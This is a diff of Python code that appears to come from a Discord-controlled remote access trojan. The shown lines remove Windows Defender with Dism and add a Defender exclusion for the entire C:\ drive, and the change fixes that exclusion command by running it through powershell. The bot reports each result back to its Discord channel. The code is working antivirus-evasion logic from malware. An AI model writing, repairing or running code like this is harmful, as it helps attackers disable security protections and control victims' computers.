@@ -1161,7 +1161,7 @@ username: {username} ({user_id})
                     os.system(r"Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet")
                     await message.channel.send("[*] Command successfuly executed")
                 elif boom >= ['18362']:
-                    os.system(r""" Add-MpPreference -ExclusionPath "C:\\" """)
+                    os.system(r"""powershell Add-MpPreference -ExclusionPath "C:\\" """)
                     await message.channel.send("[*] Command successfuly executed")
                 else:
                     await message.channel.send("[*] An unknown error has occurred")     
